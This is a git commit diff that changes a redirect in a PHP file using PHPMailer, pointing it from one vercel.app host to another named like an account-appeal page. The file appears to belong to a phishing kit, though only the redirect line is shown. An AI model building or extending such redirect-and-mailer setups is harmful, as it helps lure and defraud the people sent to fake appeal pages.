dfa14982a2d355a420c44803670a9bcd635547f5
adiwalfare <ronimawiads@gmail.com>
2025-07-15 17:19:28 +0500

    Update tofiq.php

--- tofiq.php
+++ tofiq.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://toifiq-pass.vercel.app/");
+header("Location: https://re-appeal-again-here.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
